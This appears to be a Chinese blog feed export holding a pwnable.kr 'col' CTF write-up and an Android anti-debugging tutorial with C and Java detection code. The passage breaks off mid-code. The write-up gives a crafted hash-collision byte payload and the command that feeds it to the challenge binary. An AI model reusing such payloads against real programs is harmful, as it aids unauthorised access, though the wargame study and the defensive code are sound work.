<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.52pojie.cn/thread-704056-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-704056-1-1.html</a><br><a href="https://blog.csdn.net/jiangwei0910410003/article/details/51500328" target="_blank" rel="noopener">https://blog.csdn.net/jiangwei0910410003/article/details/51500328</a><br><a href="https://www.cnblogs.com/liushilin/p/6292263.html#_label2" target="_blank" rel="noopener">https://www.cnblogs.com/liushilin/p/6292263.html#_label2</a><br><a href="https://www.jianshu.com/p/6332418b12b1" target="_blank" rel="noopener">https://www.jianshu.com/p/6332418b12b1</a><br><a href="https://blog.csdn.net/zeqiao/article/details/77893167" target="_blank" rel="noopener">https://blog.csdn.net/zeqiao/article/details/77893167</a></p>
]]></content>
      <categories>
        <category>理论学习</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>NDK</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwnable.kr题解之col</title>
    <url>/2018/03/31/Pwnable.kr%E9%A2%98%E8%A7%A3%E4%B9%8Bcol/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>这是第二道Pwn练习collision。链接pwnable.kr,下面简单讲解下分析过程。</p>
</blockquote>
<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><blockquote>
<p>前面的一些下载链接操作这里就不介绍了。直接从linux系统开始调试。<br>首先运行下程序，对程序整体有个把握。</p>
</blockquote>
<a id="more"></a>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180331/p1.png" alt=""></p>
<blockquote>
<p>可以看到程序运行需要一个参数，而且要20个字节</p>
</blockquote>
<blockquote>
<p>再使用命令将程序反编译，查看主要函数与代码。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">objdump -d col</span><br></pre></td></tr></table></figure>
<blockquote>
<p>观察发现有一个check_password函数，观察貌似是运算相加，然后比较，</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180331/p2.png" alt=""></p>
<blockquote>
<p>接下来请出调试神器—GDB，在check_password下断点。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180331/p3.png" alt=""></p>
<blockquote>
<p>下完断点，将程序运行起来，输入“1234567890qwertyuiop”,看程序是怎样运算字符。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180331/p4.png" alt=""></p>
<blockquote>
<p>过程这里就不详细描述了，可以发现程序将20个字符分成五部分，每部分4个字符，将转换后的数值累加起来，最后等于0x21dd09ec 。这样思路就有了。</p>
</blockquote>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><blockquote>
<p>既然这样我们可以将0x21dd09ec=568134124(10进制)<br>568134124 % 5=4<br>(568134124-4)/5==113626824<br>这样就得到了前四个数(十进制)<br>最后一个数是113626824+4=113626828<br>转化为十六进制分别是为0x6c5cec8   0x6c5cecc<br>但要注意的是内存中小端存贮，<br>payload=’\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06’<br>可以使用ssh连接，然后使用下面命令：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;col &#96;python -c &#39;print &quot;\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06&quot; &#39; &#96;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>关于数字的组合有很多种，不局限于这一种。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180331/p5.png" alt=""></p>
<p>个人拙见，如有错请大佬指正！</p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓反调试检测技术</title>
    <url>/2018/05/28/%E5%AE%89%E5%8D%93%E5%8F%8D%E8%B0%83%E8%AF%95%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>反调试在代码保护中扮演者重要的角色。逆向人员人员拿到apk后会对其反编译，阅读易读的java代码,有必要还会对其进行动态调试。反调试虽然不能完全阻止程序被逆向。但能一定程度上增大分析的难度。本文从四个层面对一些反调试的方法进行了说明。随着技术的日新月异，肯定还会有新的方法不断涌现。</p>
</blockquote>
<a id="more"></a>
<h2 id="Java层面保护"><a href="#Java层面保护" class="headerlink" title="Java层面保护"></a>Java层面保护</h2><h3 id="代码混淆技术"><a href="#代码混淆技术" class="headerlink" title="代码混淆技术"></a>代码混淆技术</h3><blockquote>
<p>因为分析native代码难度较大，可以有效的保护程序。但一些开发者不具备C/C++编程基础，就可以考虑下使用代码混淆技术了。java语言编写的代码很容易被反编译，所以安卓的SDK中加入了Proguard代码混淆工具，开发人员可以使用该工具对代码进行混淆。<br>ProGuard是一个压缩、优化和混淆Java字节码文件的免费的工具，它可以删除无用的类、字段、方法和属性。可以删除没用的注释，最大限度地优化字节码文件。它还可以使用简短的无意义的名称来重命名已经存在的类、字段、方法和属性。常常用于Android开发用于混淆最终的项目，增加项目被反编译的难度。<br><strong>这里只是对Proguard作简单介绍，具体操作可自行百度</strong></p>
</blockquote>
<h3 id="调试器检测"><a href="#调试器检测" class="headerlink" title="调试器检测"></a>调试器检测</h3><ul>
<li>isDebuggerConnected():安卓系统在android.os.Debug类中提供了isDebuggerConected()方法，用于检测是否有调试器链接。返回值为true则表示被调试。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(android.os.Debug.isDebuggerConnected()&#x3D;&#x3D;0)</span><br><span class="line">&#123;</span><br><span class="line">    android.os.Process.killProcess(android.os.Process.myPid());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>检测android:debuggable=”false”属性。可以通过在AndroidManifest文件的application中加入android:debuggable=”false”使程序禁止调试。因为程序要调试的话需要将属性值改为”true”。因此可以在代码中检测这个属性的值，来判断程序是否被修改过。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(getApplicationInfo().flags&amp;&#x3D;ApplicationInfo.FLAG_DEBUGGABLE!&#x3D;0)</span><br><span class="line">&#123;</span><br><span class="line">   system.out.println(&quot;Debug&quot;);</span><br><span class="line">   android.os.Process.killProcess(android.os.Process.myPid());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Native层面"><a href="#Native层面" class="headerlink" title="Native层面"></a>Native层面</h2><h3 id="Ptrace自身进程"><a href="#Ptrace自身进程" class="headerlink" title="Ptrace自身进程"></a>Ptrace自身进程</h3>Ptrace函数原型为：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int ptrace(int request,int pid,int addr,int data)</span><br></pre></td></tr></table></figure></li>
<li>第一个参数指示了ptrace要执行的命令</li>
<li>第二个参数指示了ptrace要跟踪的进程</li>
<li>第三个参数指示了要监控的内存地址</li>
<li>第四个参数指示了存放读取出的或者要写入的数据。</li>
</ul>
<blockquote>
<p>ptrace可以提供父进程观察和控制子进程的能力。当使用ptrace跟踪后，所有发送给被跟踪的子进程的信号都转发给父进程，而子进程则会被阻塞。这时子进程的状态就会被标注为TASK_TRACED。而父进程收到信号后就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行。ptrace有一个很重要的特性 ：一个进程只能被一个进程调试。根据这个特点，只需要在自己的进程调用ptrace就能一定程度上阻止被其他调试器调试。</p>
</blockquote>
<hr>
<blockquote>
<p>在调试状态下，linux会向/proc/pid/status写入一些进程状态信息，比如TracePid会写入调试进程的pid。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180527/1.png" alt="调试前"></p>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180527/2.png" alt="调试后"></p>
<p><img src="https://raw.githubusercontent.com/BigFog/Photo_Save/master/180527/3.png" alt="进程名"></p>
<blockquote>
<p>这里对android_server的名字进行了重命名，可以看到主进程很明显是anzhuo_server。注意：TracerPid值就是进程的父进程pid值。根据一个进程只能被一个进程调试的特性，可以让进程自己ptrace自己，然后让android_server不能够调试。代码还是比较简单。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void test_ptrace(void)&#123;</span><br><span class="line">ptrace(PTRACE_TRACEME,0,0,0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>PTRACE_TRACEME代表本进程被自身进程ptrace。因为一个进程只能被附加一次，所以，程序一旦被自身附加，后面的调试附加就会失败。</p>
<h3 id="进程状态检测"><a href="#进程状态检测" class="headerlink" title="进程状态检测"></a>进程状态检测</h3><blockquote>
<p>检查进程状态也可以理解为检测Tracepid的值。使用IDA调试，需要在手机上启动android_server。一旦调试附加，TracedPid的值就是android_server的进程值。根据上面调试前后tracepid的值。如果不为0，则当前进程可能正在被调试。根据这个特性，可以来判断程序是否被调试。可以在JNI_Onload中加入检测函数。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void check_tracerpid()</span><br><span class="line">&#123;</span><br><span class="line">    int pid &#x3D; getpid();</span><br><span class="line">    int bufsize &#x3D; 256;</span><br><span class="line">    char filename[bufsize];</span><br><span class="line">    char line[bufsize];</span><br><span class="line">    int tracerpid;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    sprintf(filename, &quot;&#x2F;proc&#x2F;%d&#x2F;status&quot;, pid);</span><br><span class="line">    fp &#x3D; fopen(filename, &quot;r&quot;);</span><br><span class="line">    if (fp !&#x3D; NULL) &#123;</span><br><span class="line">        while (fgets(line, bufsize, fp)) &#123;</span><br><span class="line">            if (strstr(line, &quot;TracerPid&quot;) !&#x3D; NULL) &#123;</span><br><span class="line">                tracerpid &#x3D; atoi(&amp;line[10]);</span><br><span class="line">                if (tracerpid !&#x3D; 0) &#123;</span><br><span class="line">                    int ret &#x3D; kill(pid, SIGKILL);</span><br><span class="line">                &#125;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="调试端口检测"><a href="#调试端口检测" class="headerlink" title="调试端口检测"></a>调试端口检测</h3><blockquote>
<p>netstat命令经常用来查看正在运行应用的本地端口号,pid,uid等信息。而执行cat /proc/net/tcp 也可以来查看正在运行应用的本地端口号，这就提供了一个检测思路。读取/proc/net/tcp的内容，查找23946端口(IDA调试的默认端口)，如果找到了该端口则说明进程正在被调试。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void CheckPort23946()</span><br><span class="line">&#123;</span><br><span class="line">    FILE* pfile&#x3D;NULL;</span><br><span class="line">    char buf[0x1000]&#x3D;&#123;0&#125;;</span><br><span class="line">    &#x2F;&#x2F; 执行命令</span><br><span class="line">    char* strCatTcp&#x3D; &quot;cat &#x2F;proc&#x2F;net&#x2F;tcp |grep :5D8A&quot;;</span><br><span class="line">    &#x2F;&#x2F;char* strNetstat&#x3D;&quot;netstat |grep :23946&quot;;</span><br><span class="line">    pfile&#x3D;popen(strCatTcp,&quot;r&quot;);</span><br><span class="line">    if(NULL&#x3D;&#x3D;pfile)</span><br><span class="line">    &#123;</span><br><span class="line">        LOGA(&quot;CheckPort23946ByTcp popen打开命令失败!\n&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    while(fgets(buf,sizeof(buf),pfile))</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F; 执行到这里，判定为调试状态</span><br><span class="line">        LOGA(&quot;执行cat &#x2F;proc&#x2F;net&#x2F;tcp |grep :5D8A的结果:\n&quot;);</span><br><span class="line">        LOGB(&quot;%s&quot;,buf);</span><br><span class="line">    &#125;&#x2F;&#x2F;while</span><br><span class="line">    pclose(pfile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="进程名称检测"><a href="#进程名称检测" class="headerlink" title="进程名称检测"></a>进程名称检测</h3><blockquote>
<p>端口可以检测那可以通过检测进程名字来判断是否被调试。利用ps命令列出所有进程，然后遍历查找，查找固定的进程名，如android_server gdb_server android_x64/86_server mac_server/64等。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void SearchProcess()</span><br><span class="line">&#123;</span><br><span class="line">    FILE* pfile&#x3D;NULL;</span><br><span class="line">    char buf[0x1000]&#x3D;&#123;0&#125;;</span><br><span class="line">    &#x2F;&#x2F; 执行命令</span><br><span class="line">  </span><br><span class="line">   pfile&#x3D;popen(&quot;ps&quot;,&quot;r&quot;);</span><br><span class="line">    if(NULL&#x3D;&#x3D;pfile)</span><br><span class="line">    &#123;</span><br><span class="line">        LOGA(&quot;SearchProcess popen打开命令失败!\n&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 获取结果</span><br><span class="line">    LOGA(&quot;popen方案:\n&quot;);</span><br><span class="line">    while(fgets(buf,sizeof(buf),pfile))</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F; 打印进程</span><br><span class="line">        LOGB(&quot;遍历进程:%s\n&quot;,buf);</span><br><span class="line">        &#x2F;&#x2F; 查找子串</span><br><span class="line">        char* strA&#x3D;NULL,strB&#x3D;NULL,strC&#x3D;NULL,strD&#x3D;NULL;</span><br><span class="line">        strA&#x3D;strstr(buf,&quot;android_server&quot;);</span><br><span class="line">        strB&#x3D;strstr(buf,&quot;gdbserver&quot;);</span><br><span class="line">        strC&#x3D;strstr(buf,&quot;gdb&quot;);</span><br><span class="line">        strD&#x3D;strstr(buf,&quot;fuwu&quot;);</span><br><span class="line">        &#x2F;&#x2F;可以自己加</span><br><span class="line">        if(strA || strB ||strC || strD)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; 执行到这里，判定为调试状态</span><br><span class="line">            LOGB(&quot;发现目标进程:%s\n&quot;,buf);</span><br><span class="line">        &#125;&#x2F;&#x2F;if</span><br><span class="line">    &#125;&#x2F;&#x2F;while</span><br><span class="line">    pclose(pfile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>以上是一种方案这里也有另外一种操作。<br>调试进程的时候，进程会被IDA中的android_server附加，而在/proc/pid/cmdline中会有进程的进程名，因此通过android_server的进程号就可以找到她的进程名。这里总觉得和上面有重复的感觉，那就换种思路。常规操作下，android_server都会放在/data/local/tmp目录下，那直接检测这个目录下有没有程序不就行了，如果有就退出。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void check_andser()</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#x2F;&#x2F; 获取tracerpid之后</span><br><span class="line">    if (tracerpid !&#x3D; 0) &#123;</span><br><span class="line">        sprintf(filename, &quot;&#x2F;proc&#x2F;%d&#x2F;cmdline&quot;, tracerpid);</span><br><span class="line">        FILE *fd &#x3D; fopen(filename, &quot;r&quot;);</span><br><span class="line">        if (fd !&#x3D; NULL) &#123;</span><br><span class="line">            while (fgets(nameline, bufsize, fd)) &#123;</span><br><span class="line">                if (strstr(nameline, &quot;android_server&quot;) !&#x3D; NULL) &#123;</span><br><span class="line">                    int ret &#x3D; kill(pid, SIGKILL);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="APK线程检测"><a href="#APK线程检测" class="headerlink" title="APK线程检测"></a>APK线程检测</h3><blockquote>
<p>这个也是第一次听说。网上看大佬博客：正常apk进程一般会有十几个线程在运行(比如会有jdwp线程)，<br>自己写可执行文件加载so一般只有一个线程，可以根据这个差异来进行调试环境检测。这里就不做介绍了。</p>
</blockquote>
<h3 id="程序运行时间差检测"><a href="#程序运行时间差检测" class="headerlink" title="程序运行时间差检测"></a>程序运行时间差检测</h3><blockquote>
<p>对程序进行动态调试时经常会下断点或者对相关的寄存器查看。这样程序的就会被挂起暂停执行。这时代码的前后时间差就会比正常时间大，因此可以利用这个特点来判断代码是否被调试。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int gettimeofday(struct timeval *tv, struct timezone *tz);</span><br><span class="line">void check_time()</span><br><span class="line">&#123;</span><br><span class="line">    int pid &#x3D; getpid();</span><br><span class="line">    struct timeval t1;</span><br><span class="line">    struct timeval t2;</span><br><span class="line">    struct timezone tz;</span><br><span class="line">    gettimeofday(&amp;t1, &amp;tz);</span><br><span class="line">    gettimeofday(&amp;t2, &amp;tz);</span><br><span class="line">    int timeoff &#x3D; (t2.tv_sec) - (t1.tv_sec);</span><br><span class="line">    if (timeoff &gt; 1) &#123;</span><br><span class="line">        int ret &#x3D; kill(pid, SIGKILL);</span><br><span class="line">        return ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="防止dump"><a href="#防止dump" class="headerlink" title="防止dump"></a>防止dump</h3><blockquote>
<p>在对程序脱壳中，经常可能做的就是dump内存操作。脱壳时会到/proc/pid/mem或者/proc/pid/maps下dump内存数据。这里可以使用inotify对文件进行监控，如果发现对文件系统事件的打开，读写，有可能程序在被分析破解。此时通过inotify收到事件变化，就可以执行杀死进程操作。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void check_inotify()</span><br><span class="line">&#123;</span><br><span class="line">    int ret, len, i;</span><br><span class="line">    int pid &#x3D; getpid();</span><br><span class="line">    const int MAXLEN &#x3D; 2048;</span><br><span class="line">    char buf[1024];</span><br><span class="line">    char readbuf[MAXLEN];</span><br><span class="line">    int fd, wd;</span><br><span class="line">    fd_set readfds;&#x2F;&#x2F;定义文件描述符字的集合</span><br><span class="line">    fd &#x3D; inotify_init();&#x2F;&#x2F;用于创建一个 inotify 实例的系统调用，并返回一个指向该实例的文件描述符</span><br><span class="line">    sprintf(buf, &quot;&#x2F;proc&#x2F;%d&#x2F;maps&quot;, pid);</span><br><span class="line">    wd &#x3D; inotify_add_watch(fd, buf, IN_ALL_EVENTS);</span><br><span class="line">    &#x2F;&#x2F;增加对文件或者目录的监控，并指定需要监控哪些事件。标志用于控制是否将事件添加到已有的监控中，是否只有路径代表一个目录才进行监控，是否要追踪符号链接，是否进行一次性监控，当首次事件出现后就停止监控</span><br><span class="line">    if (wd &gt;&#x3D; 0) &#123;</span><br><span class="line">        while (1) &#123;</span><br><span class="line">            i &#x3D; 0;</span><br><span class="line">            FD_ZERO(&amp;readfds); &#x2F;&#x2F; 对文件描述符集清空</span><br><span class="line">            FD_SET(fd, &amp;readfds); &#x2F;&#x2F; 将fd加入readfds集合</span><br><span class="line">            ret &#x3D; select(fd + 1, &amp;readfds, 0, 0, 0);&#x2F;&#x2F;检查套接字是否可读</span><br><span class="line">            if (ret &#x3D;&#x3D; -1) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125; </span><br><span class="line">            if (ret) &#123;</span><br><span class="line">                len &#x3D; read(fd, readbuf, MAXLEN);&#x2F;&#x2F;读取包含一个或者多个事件信息的缓存</span><br><span class="line">                while (i &lt; len) &#123;</span><br><span class="line">                    struct inotify_event *event &#x3D; (struct inotify_event *) &amp;readbuf[i];</span><br><span class="line">                    if ((event-&gt;mask &amp; IN_ACCESS) || (event-&gt;mask &amp; IN_OPEN)) &#123;</span><br><span class="line">                        int ret &#x3D; kill(pid, SIGKILL);</span><br><span class="line">                        return;</span><br><span class="line">                    &#125;</span><br><span class="line">                    i +&#x3D; sizeof(struct inotify_event) + event-&gt;len;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    inotify_rm_watch(fd, wd);&#x2F;&#x2F;从监控列表中移出监控项目</span><br><span class="line">    close(fd);&#x2F;&#x2F;关闭文件描述符，并且移除所有在该描述符上的所有监控。当关于某实例的所有文件描述符都关闭时，资源和下层对象都将释放，以供内核再次使用。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>当应用程序读取到一个通告时，事件的顺序也被读取到提供的缓存中。事件在一个变长结构中被返回。结构如下:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct inotify_event</span><br><span class="line">&#123;</span><br><span class="line">  int wd;               &#x2F;* Watch descriptor.  *&#x2F;</span><br><span class="line">  uint32_t mask;        &#x2F;* Watch mask.  *&#x2F;</span><br><span class="line">  uint32_t cookie;      &#x2F;* Cookie to synchronize two events.  *&#x2F;</span><br><span class="line">  uint32_t len;         &#x2F;* Length (including NULs) of name.  *&#x2F;</span><br><span class="line">  char name __flexarr;  &#x2F;* Name.  *&#x2F;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里要注意的是，只有当监控对象是一个目录并且事件与目录内部相关相关有关，且与目录本身无关时，才提供name字段。如果 IN_MOVED_FROM 事件与相应的 IN_MOVED_TO 事件都与被监控的项目有关，cookie 就可用于将两者关联起来。事件类型在掩码字段中返回，并伴随着能够被内核设置的标志。例如，如果事件与目录有关，则标志 IN_ISDIR 将由内核设置。</p>
</blockquote>
<p>典型的监控程序需要进行如下操作：</p>
<ol>
<li>使用inotify_init打开一个文件描述符。</li>
<li>添加一个或者多个监控。</li>
<li>等待事件。</li>
<li>处理事件，然后返回并等待更多事件。</li>
<li>当监控不再活动时，或者接到某个信号之后，关闭文件描述符，清空，然后退出。<h3 id="断点检测"><a href="#断点检测" class="headerlink" title="断点检测"></a>断点检测</h3><blockquote>
<p>Arm程序下断点，调试器首先要保存目标地址处指令，然后将目标地址处指令替换成断点指令。例如0x01,0x00,0x9f,0xef等。当命中断点后，系统产生SIGTRAP信号，调试器收到信号后，首先恢复断点处原指令，然后回退被跟踪进程的当前pc。这时当控制权回到被调试程序时，正好执行断点位置指令。这就是arm平台断点的原理。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;elf.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line"></span><br><span class="line">void checkBreakPoint ();</span><br><span class="line">unsigned long getLibAddr (const char *lib);</span><br><span class="line">#define LOG_TAG &quot;ANTIDBG_DEMO&quot;</span><br><span class="line">#include &lt;android&#x2F;log.h&gt;</span><br><span class="line">#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)</span><br><span class="line">int main ()</span><br><span class="line">&#123;</span><br><span class="line">    dlopen (&quot;.&#x2F;libdemo.so&quot;, RTLD_NOW);</span><br><span class="line">    sleep (60);</span><br><span class="line">    checkBreakPoint ();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">unsigned long getLibAddr (const char *lib) </span><br><span class="line">&#123;</span><br><span class="line">    puts (&quot;Enter getLibAddr&quot;);</span><br><span class="line">    unsigned long addr &#x3D; 0;</span><br><span class="line">    char lineBuf[256];</span><br><span class="line"></span><br><span class="line">    snprintf (lineBuf, 256-1, &quot;&#x2F;proc&#x2F;%d&#x2F;maps&quot;, getpid ());</span><br><span class="line">    FILE *fp &#x3D; fopen (lineBuf, &quot;r&quot;);</span><br><span class="line">    if (fp &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">        perror (&quot;fopen failed&quot;);</span><br><span class="line">        goto bail;</span><br><span class="line">    &#125;</span><br><span class="line">    while (fgets (lineBuf, sizeof(lineBuf), fp)) &#123;</span><br><span class="line">        if (strstr (lineBuf, lib)) &#123;</span><br><span class="line">            char *temp &#x3D; strtok (lineBuf, &quot;-&quot;);</span><br><span class="line">            addr &#x3D; strtoul (temp, NULL, 16);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">bail: </span><br><span class="line">    fclose(fp);</span><br><span class="line">    return addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void checkBreakPoint ()</span><br><span class="line">&#123;</span><br><span class="line">    int i, j;</span><br><span class="line">    unsigned int base, offset, pheader;</span><br><span class="line">    Elf32_Ehdr *elfhdr;</span><br><span class="line">    Elf32_Phdr *ph_t;</span><br><span class="line"></span><br><span class="line">    base &#x3D; getLibAddr (&quot;libdemo.so&quot;);</span><br><span class="line">    if (base &#x3D;&#x3D; 0) &#123;</span><br><span class="line">        LOGI (&quot;getLibAddr failed&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    elfhdr &#x3D; (Elf32_Ehdr *) base;</span><br><span class="line">    pheader &#x3D; base + elfhdr-&gt;e_phoff;</span><br><span class="line"></span><br><span class="line">    for (i &#x3D; 0; i &lt; elfhdr-&gt;e_phnum; i++) &#123;</span><br><span class="line">        ph_t &#x3D; (Elf32_Phdr*)(pheader + i * sizeof(Elf32_Phdr)); &#x2F;&#x2F; traverse program header</span><br><span class="line"></span><br><span class="line">        if ( !(ph_t-&gt;p_flags &amp; 1) ) continue;</span><br><span class="line">        offset &#x3D; base + ph_t-&gt;p_vaddr;</span><br><span class="line">        offset +&#x3D; sizeof(Elf32_Ehdr) + sizeof(Elf32_Phdr) * elfhdr-&gt;e_phnum;</span><br><span class="line"></span><br><span class="line">        char *p &#x3D; (char*)offset;</span><br><span class="line">        for (j &#x3D; 0; j &lt; ph_t-&gt;p_memsz; j++) &#123;</span><br><span class="line">            if(*p &#x3D;&#x3D; 0x01 &amp;&amp; *(p+1) &#x3D;&#x3D; 0xde) &#123;</span><br><span class="line">                LOGI (&quot;Find thumb bpt %p&quot;, p);</span><br><span class="line">            &#125; else if (*p &#x3D;&#x3D; 0xf0 &amp;&amp; *(p+1) &#x3D;&#x3D; 0xf7 &amp;&amp; *(p+2) &#x3D;&#x3D; 0x00 &amp;&amp; *(p+3) &#x3D;&#x3D; 0xa0) &#123;</span><br><span class="line">                LOGI (&quot;Find thumb2 bpt %p&quot;, p);</span><br><span class="line">            &#125; else if (*p &#x3D;&#x3D; 0x01 &amp;&amp; *(p+1) &#x3D;&#x3D; 0x00 &amp;&amp; *(p+2) &#x3D;&#x3D; 0x9f &amp;&amp; *(p+3) &#x3D;&#x3D; 0xef) &#123;</span><br><span class="line">                LOGI (&quot;Find arm bpt %p&quot;, p);</span><br><span class="line">            &#125;</span><br><span class="line">            p++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="单步检测"><a href="#单步检测" class="headerlink" title="单步检测"></a>单步检测</h3><blockquote>
<p>这种单步检测可以就用代码执行时间差来发现。</p>
</blockquote>
<h2 id="emulator层面"><a href="#emulator层面" class="headerlink" title="emulator层面"></a>emulator层面</h2><blockquote>
<p>一般在分析apk的过程中会借助android模拟器。因此从apk自我保护的角度出发，可以对程序的运行环境检测，判断是否运行在模拟器中，如果运行在模拟器中则退出整个应用程序或者调到其他分支。可以通过属性检测，虚拟机文件检测，基于cache行为,代码指令执行检测等。</p>
</blockquote>
<h3 id="属性检测"><a href="#属性检测" class="headerlink" title="属性检测"></a>属性检测</h3><blockquote>
<p>判断当前设备是否是模拟器。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class AntiEmulator &#123;</span><br><span class="line">    private static String[] known_pipes&#x3D;&#123;</span><br><span class="line">            &quot;&#x2F;dev&#x2F;socket&#x2F;qemud&quot;,</span><br><span class="line">            &quot;&#x2F;dev&#x2F;qemu_pipe&quot;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    private static String[] known_qemu_drivers &#x3D; &#123;</span><br><span class="line">            &quot;goldfish&quot;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    private static String[] known_files &#x3D; &#123;</span><br><span class="line">            &quot;&#x2F;system&#x2F;lib&#x2F;libc_malloc_debug_qemu.so&quot;,</span><br><span class="line">            &quot;&#x2F;sys&#x2F;qemu_trace&quot;,</span><br><span class="line">            &quot;&#x2F;system&#x2F;bin&#x2F;qemu-props&quot;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    private static String[] known_numbers &#x3D; &#123; &quot;15555215554&quot;, &quot;15555215556&quot;,</span><br><span class="line">            &quot;15555215558&quot;, &quot;15555215560&quot;, &quot;15555215562&quot;, &quot;15555215564&quot;,</span><br><span class="line">            &quot;15555215566&quot;, &quot;15555215568&quot;, &quot;15555215570&quot;, &quot;15555215572&quot;,</span><br><span class="line">            &quot;15555215574&quot;, &quot;15555215576&quot;, &quot;15555215578&quot;, &quot;15555215580&quot;,</span><br><span class="line">            &quot;15555215582&quot;, &quot;15555215584&quot;, &#125;;</span><br><span class="line">    private static String[] known_device_ids &#x3D; &#123; </span><br><span class="line">            &quot;000000000000000&quot; &#x2F;&#x2F; 默认ID</span><br><span class="line">    &#125;;</span><br><span class="line">    private static String[] known_imsi_ids &#x3D; &#123; </span><br><span class="line">            &quot;310260000000000&quot; &#x2F;&#x2F; 默认的 imsi id</span><br><span class="line">    &#125;;</span><br><span class="line">    &#x2F;&#x2F;检测“&#x2F;dev&#x2F;socket&#x2F;qemud”，“&#x2F;dev&#x2F;qemu_pipe”这两个通道</span><br><span class="line">    public static boolean 